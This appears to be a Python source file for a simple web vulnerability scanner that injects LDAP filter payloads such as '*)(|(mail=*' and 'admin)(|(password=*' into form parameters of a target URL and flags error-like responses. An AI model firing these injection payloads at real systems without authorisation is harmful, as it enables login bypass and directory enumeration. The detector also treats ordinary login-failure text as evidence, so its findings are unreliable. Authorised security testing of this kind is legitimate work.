from typing import Dict, List
import requests

class LDAPScanner:
    def __init__(self):
        self.ldap_filters = [
            '*',
            '*)(|(mail=*',
            'admin)(|(password=*',
            '*)(uid=*',
            'admin*)(|(uid=*'
        ]
    
    def scan(self, url: str, parameters: Dict = None) -> List[Dict]:
        vulnerabilities = []
        if not parameters:
            parameters = {'username': 'admin', 'password': 'admin'}
        for param_name in parameters.keys():
            for ldap_filter in self.ldap_filters:
                test_params = parameters.copy()
                test_params[param_name] = ldap_filter
                try:
                    response = requests.post(url, data=test_params, timeout=10)
                    if self._check_ldap_injection(response.text):
                        vulnerabilities.append({
                            'type': 'LDAP Injection',
                            'severity': 'Critical',
                            'parameter': param_name,
                            'payload': ldap_filter,
                            'description': 'LDAP injection detected',
                            'evidence': 'Unexpected LDAP response'
                        })
                except Exception:
                    pass
        return vulnerabilities
    
    def _check_ldap_injection(self, response: str) -> bool:
        indicators = [
            'invalid credentials',
            'ldap error',
            'directory error',
            'search error'
        ]
        return any(indicator in response.lower() for indicator in indicators)